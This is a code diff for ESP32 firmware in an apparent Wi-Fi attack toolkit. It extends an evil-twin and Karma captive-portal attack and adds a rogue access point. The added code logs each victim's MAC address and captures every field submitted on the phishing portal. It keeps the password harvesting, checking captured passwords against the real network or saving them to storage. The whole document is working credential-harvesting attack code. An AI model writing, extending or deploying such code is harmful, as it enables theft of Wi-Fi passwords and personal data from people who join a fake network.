@@ -75,7 +75,7 @@ static pending_karma_save_t pending_karma_save = { .pending = false };
 static evil_twin_event_cb_t evil_twin_event_callback = NULL;
 
 // Helper function to emit Evil Twin events
-static void emit_evil_twin_event(evil_twin_event_t event, const char *ssid, const char *password) {
+static void emit_evil_twin_event_ex(evil_twin_event_t event, const char *ssid, const char *password, const char *mac) {
     if (evil_twin_event_callback) {
         evil_twin_event_data_t data;
         data.event = event;
@@ -91,8 +91,18 @@ static void emit_evil_twin_event(evil_twin_event_t event, const char *ssid, cons
         } else {
             data.password[0] = '\0';
         }
+        if (mac) {
+            strncpy(data.mac, mac, sizeof(data.mac) - 1);
+            data.mac[sizeof(data.mac) - 1] = '\0';
+        } else {
+            data.mac[0] = '\0';
+        }
         evil_twin_event_callback(&data);
     }
+}
+
+static void emit_evil_twin_event(evil_twin_event_t event, const char *ssid, const char *password) {
+    emit_evil_twin_event_ex(event, ssid, password, NULL);
 }
 
 void wifi_attacks_set_evil_twin_event_cb(evil_twin_event_cb_t cb) {
@@ -426,18 +436,24 @@ static void portal_event_handler(void *arg, esp_event_base_t event_base,
     if (event_base == WIFI_EVENT) {
         if (event_id == WIFI_EVENT_AP_STACONNECTED) {
             wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
-            (void)event;
-            ESP_LOGI(TAG, "Client connected to Portal AP");
+            char mac_str[18];
+            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     event->mac[0], event->mac[1], event->mac[2],
+                     event->mac[3], event->mac[4], event->mac[5]);
+            ESP_LOGI(TAG, "Client connected to Portal AP: %s", mac_str);
             stats_clients_connected++;
-            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_CONNECTED, evilTwinSSID, NULL);
+            emit_evil_twin_event_ex(EVIL_TWIN_EVENT_CLIENT_CONNECTED, evilTwinSSID, NULL, mac_str);
         } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
             wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
-            (void)event;
-            ESP_LOGI(TAG, "Client disconnected from Portal AP");
+            char mac_str[18];
+            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     event->mac[0], event->mac[1], event->mac[2],
+                     event->mac[3], event->mac[4], event->mac[5]);
+            ESP_LOGI(TAG, "Client disconnected from Portal AP: %s", mac_str);
             if (stats_clients_connected > 0) {
                 stats_clients_connected--;
             }
-            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL);
+            emit_evil_twin_event_ex(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL, mac_str);
         }
     }
 }
@@ -1240,6 +1256,7 @@ static esp_err_t captive_api_handler(httpd_req_t *req) {
 
 // Portal page handler
 static esp_err_t portal_handler(httpd_req_t *req) {
+    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_OPENED, evilTwinSSID, NULL);
     httpd_resp_set_type(req, "text/html");
     const char* portal_html = (custom_portal_html != NULL && strlen(custom_portal_html) > 0) ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
@@ -1444,35 +1461,56 @@ static esp_err_t portal_submit_handler(httpd_req_t *req) {
     }
     buf[ret] = '\0';
     
-    // Parse password from POST data
+    // Always emit FORM_DATA with all key=value pairs for UI display
+    {
+        char form_display[256];
+        form_display[0] = '\0';
+        char *buf_copy = strdup(buf);
+        if (buf_copy) {
+            char *saveptr = NULL;
+            char *field = strtok_r(buf_copy, "&", &saveptr);
+            size_t pos = 0;
+            while (field != NULL && pos < sizeof(form_display) - 1) {
+                char *eq = strchr(field, '=');
+                if (eq) {
+                    *eq = '\0';
+                    char *value = eq + 1;
+                    char decoded_val[64];
+                    url_decode(value, decoded_val, sizeof(decoded_val));
+                    int written = snprintf(form_display + pos, sizeof(form_display) - pos,
+                                           "%s%s=%s", pos > 0 ? "\n" : "", field, decoded_val);
+                    if (written > 0) pos += written;
+                }
+                field = strtok_r(NULL, "&", &saveptr);
+            }
+            free(buf_copy);
+        }
+        emit_evil_twin_event(EVIL_TWIN_EVENT_FORM_DATA, evilTwinSSID, form_display);
+    }
+    
+    // Parse password from POST data for Evil Twin / Karma verification
     char *password_start = strstr(buf, "password=");
     if (password_start) {
-        password_start += 9; // Skip "password="
+        password_start += 9;
         char *password_end = strchr(password_start, '&');
         if (password_end) {
             *password_end = '\0';
         }
         
-        // URL decode the password
         char decoded_password[64];
         url_decode(password_start, decoded_password, sizeof(decoded_password));
         
         ESP_LOGI(TAG, "Client submitted password");
         
-        // Emit password provided event
         emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_PROVIDED, evilTwinSSID, NULL);
         
-        // Check mode: Karma, Evil Twin, or Regular Portal
         if (karma_mode) {
-            // Karma mode - save data but DON'T attempt WiFi connection
             ESP_LOGI(TAG, "Karma mode: Saving data without WiFi verification");
             save_karma_data(evilTwinSSID, buf);
         } else if (strlen(evilTwinSSID) > 0) {
-            // Evil Twin mode - verify password by attempting WiFi connection
             ESP_LOGI(TAG, "Evil Twin mode: Verifying password...");
             verify_password(decoded_password);
         } else {
-            // Regular portal mode - save all form data to portals.txt
             save_portal_data("portal", buf);
         }
     }
@@ -1889,6 +1927,91 @@ esp_err_t wifi_attacks_start_portal(const char *ssid) {
     start_portal_services();
     
     // Emit portal deployed event
+    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
+    
+    return ESP_OK;
+}
+
+esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password) {
+    if (!ssid || !password) {
+        ESP_LOGE(TAG, "Rogue AP requires both SSID and password");
+        return ESP_ERR_INVALID_ARG;
+    }
+    
+    ESP_LOGI(TAG, "Starting Rogue AP: %s", ssid);
+    
+    strncpy(evilTwinSSID, ssid, 32);
+    evilTwinSSID[32] = '\0';
+    
+    karma_mode = true;
+    
+    // Disconnect STA
+    esp_wifi_disconnect();
+    vTaskDelay(pdMS_TO_TICKS(200));
+    
+    // Get or create AP netif
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (!ap_netif) {
+        ESP_LOGI(TAG, "Creating AP netif for Rogue AP...");
+        esp_wifi_stop();
+        ap_netif = esp_netif_create_default_wifi_ap();
+        if (!ap_netif) {
+            ESP_LOGE(TAG, "Failed to create AP netif");
+            esp_wifi_start();
+            return ESP_FAIL;
+        }
+        esp_wifi_set_mode(WIFI_MODE_AP);
+        esp_wifi_start();
+        vTaskDelay(pdMS_TO_TICKS(500));
+    } else {
+        esp_wifi_set_mode(WIFI_MODE_AP);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    esp_netif_dhcps_stop(ap_netif);
+    
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
+    }
+    
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .channel = 1,
+            .password = "",
+            .max_connection = 4,
+            .authmode = WIFI_AUTH_WPA2_PSK,
+        }
+    };
+    size_t ssid_len = strlen(ssid);
+    memcpy(ap_config.ap.ssid, ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    strncpy((char *)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
+    
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+    }
+    
+    vTaskDelay(pdMS_TO_TICKS(1000));
+    
+    ESP_LOGI(TAG, "Rogue AP active: %s (WPA2)", ssid);
+    stats_clients_connected = 0;
+    
+    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
+    
+    ESP_LOGI(TAG, "Rogue AP captive portal started on 172.0.0.1");
+    start_portal_services();
+    
     emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
     
     return ESP_OK;
